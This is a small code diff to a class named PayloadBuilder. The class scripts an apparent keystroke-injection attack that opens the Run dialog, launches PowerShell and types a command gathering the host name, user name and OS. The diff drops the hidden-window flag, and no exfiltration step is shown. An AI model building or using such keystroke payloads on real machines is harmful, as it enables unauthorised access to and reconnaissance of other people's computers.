@@ -40,7 +40,7 @@ class PayloadBuilder:
             'commands': [
                 {'action': 'combo', 'keys': ['WIN', 'r']},
                 {'action': 'delay', 'ms': 500},
-                {'action': 'type', 'text': 'powershell -WindowStyle Hidden'},
+                {'action': 'type', 'text': 'powershell'},
                 {'action': 'key', 'name': 'ENTER'},
                 {'action': 'delay', 'ms': 2000},
                 {'action': 'type', 'text': '$data=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;os=(Get-WmiObject Win32_OperatingSystem).Caption};'},
